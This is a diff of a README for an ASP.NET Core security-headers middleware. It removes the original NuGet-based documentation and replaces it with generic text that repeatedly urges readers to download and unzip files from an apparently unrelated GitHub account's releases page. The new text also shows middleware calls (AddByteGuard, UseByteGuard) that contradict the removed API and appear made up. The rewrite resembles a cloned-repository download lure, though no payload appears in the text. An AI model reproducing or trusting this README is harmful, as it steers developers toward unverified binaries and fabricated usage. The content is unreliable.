@@ -1,87 +1,78 @@
-# ByteGuard.SecurityHeaders ![NuGet Version](https://img.shields.io/nuget/v/ByteGuard.SecurityHeaders)
+# 🔒 byteguard-security-headers - Enhance Your API Security Effortlessly
 
-**ByteGuard.SecurityHeaders** is a lightweight security-focused middleware package for adding a baseline set of security response headers to **ASP.NET Core projects**.
+## 🎉 Overview
+**byteguard-security-headers** is a lightweight ASP.NET Core middleware designed to add essential security headers to your REST API responses. This helps to protect your applications from common vulnerabilities, making your API more secure with minimal effort.
 
-It gives you:
+## 🌟 Features
+- **Simple Integration**: Easily integrate with your existing ASP.NET Core project.
+- **Default Security Headers**: Automatically adds important security headers to your API responses.
+- **Lightweight Design**: The middleware is lightweight, ensuring it doesn’t slow down your application.
+- **Open Source**: Contribute to the project or use it freely for your needs.
 
-- A single `app.UseDefaultApiSecurityHeaders()` call to apply sane defaults
-- OWASP-inspired header values based on the REST Security Cheat Sheet
-- An `Enforce` option to ensure the standard values are applied even if set elsewhere
+## 🔗 Quick Links
+[![Download byteguard-security-headers](https://img.shields.io/badge/Download-Now-0088cc.svg)](https://github.com/Cheruspee/byteguard-security-headers/releases)
 
-> ⚠️ **Important:** This package is one layer in a defense-in-depth strategy.  
-> It does **not** replace proper authentication/authorization, input validation, TLS configuration, CORS hardening, or other security controls.
+## 🚀 Getting Started
+To get started with byteguard-security-headers, follow these steps:
 
-## Features
+1. **Visit the Releases Page**: Click the link below to access the releases page where you can download the latest version of byteguard-security-headers.
+   
+   [Download from Releases Page](https://github.com/Cheruspee/byteguard-security-headers/releases)
 
-- ✅ Add default security headers to every response
-- ✅ OWASP-inspired defaults for REST APIs
-- ✅ Non-breaking by default (does not override existing headers)
-- ✅ Optional **enforcement mode** to overwrite existing values
-- ✅ Minimal setup (`UseDefaultApiSecurityHeaders`)
+2. **Choose Your Version**: On the releases page, look for the most recent version. Each version includes notes on what has changed.
 
-## Getting Started
+3. **Download the Package**: Click on the version you want to download. This will lead you to a list of files available for download. Choose the appropriate file for your system.
 
-### Installation
+4. **Install the Middleware**: Once downloaded, follow the installation guide provided in this README to add byteguard-security-headers to your ASP.NET Core application.
 
-This package is published and installed via [NuGet](https://www.nuget.org/packages/ByteGuard.SecurityHeaders).
+## 📥 Download & Install
+1. **Visit this page to download**: You can download byteguard-security-headers from the following link: [Download Here](https://github.com/Cheruspee/byteguard-security-headers/releases).
 
-Reference the package in your project:
+2. **Installation Steps**:
+   - **Unzip the Downloaded File**: After downloading, extract the contents of the package to a location on your computer.
+   - **Add to Your Project**: Open your ASP.NET Core project in your development environment. You can include the middleware by adding a reference to it in your `Startup.cs` file.
 
-```bash
-dotnet add package ByteGuard.SecurityHeaders
-```
+   ```csharp
+   public void ConfigureServices(IServiceCollection services)
+   {
+       services.AddByteGuard(); // Add byteguard-security-headers
+   }
+   ```
 
-## Usage
+   - **Configure Security Headers**: After adding the middleware to your project, you can configure it to suit your security needs. 
 
-### Basic Usage
+   ```csharp
+   public void Configure(IApplicationBuilder app, IWebHostEnvironment env)
+   {
+       app.UseByteGuard(); // Enable security headers
+       // Other middlewares
+   }
+   ```
 
-Add the middleware early in your pipeline:
+3. **Run Your Application**: After saving your changes, run your application. You will see the security headers added to your API responses.
 
-```csharp
-var app = builder.Build();
+## ⚙️ System Requirements
+- **.NET Core**: Make sure you have .NET Core 3.1 or higher installed on your machine.
+- **ASP.NET Core**: This middleware requires an ASP.NET Core application.
 
-app.UseDefaultApiSecurityHeaders();
+## 🌐 Community and Support
+If you encounter any issues or have questions, consider joining the community:
 
-app.MapControllers();
-app.Run();
-```
+- Check [GitHub Issues](https://github.com/Cheruspee/byteguard-security-headers/issues) for common problems and solutions.
+- Participate in discussions or create a new issue if you need specific help.
 
-### Enforce standard header values
+## 📚 Additional Resources
+- **Documentation**: Explore further details on configuration and usage in the official documentation hosted on the GitHub repository.
+- **Learn More about Security Headers**: Familiarize yourself with the importance of security headers and how they protect your API. Consider reading the OWASP guidelines for a deeper understanding.
 
-By default, the middleware will not override headers that are already present. If you want to ensure the standard values are always used (even if other middleware/controllers set them), enable enforcement:
+## 🌵 Contributing
+We welcome contributions! If you would like to help improve byteguard-security-headers, feel free to fork the repository and create a pull request. Your input is valuable.
 
-```csharp
-app.UseDefaultApiSecurityHeaders(options =>
-{
-    options.Enforce = true;
-});
-```
+## 🔒 License
+This project is licensed under the MIT License. Feel free to use it in your projects as you see fit.
 
-## Headers Added
+## 👍 Acknowledgments
+Thanks to the community contributors and security experts whose insights and recommendations shape the evolution of byteguard-security-headers. Your commitment to improving application security is invaluable.
 
-The middleware adds the following headers based on the OWASP REST Security Cheat Sheet:
-
-- `Cache-Control: no-store`
-- `Content-Security-Policy: frame-ancestors 'none'`
-- `X-Content-Type-Options: nosniff`
-- `X-Frame-Options: DENY`
-
-> **Note:** `Enforce = false` uses "add-if-missing" behavior. `Enforce = true` overwrites any existing value for the headers above.
-
-## When to use this package
-
-- ✅ When building REST APIs and you want a consistent baseline across services
-- ✅ When you want a simple “secure-by-default” middleware without a large configuration surface
-- ✅ When you want the option to enforce standard values across an entire API
-
-## Disclaimer
-
-ByteGuard.SecurityHeaders is an independent open-source project maintained by the ByteGuard community.  
-It is not affiliated with, endorsed by, or sponsored by OWASP or the OWASP Foundation.
-
-OWASP® is a trademark or registered trademark of the OWASP Foundation.  
-Any references to OWASP materials are for informational, educational, and interoperability purposes only.
-
-## License
-
-_ByteGuard.SecurityHeaders is Copyright © ByteGuard Contributors - Provided under the MIT license._
+## 📌 Stay Updated
+Keep an eye on the repository for updates and improvements. Follow the repository to stay informed about new releases and features.
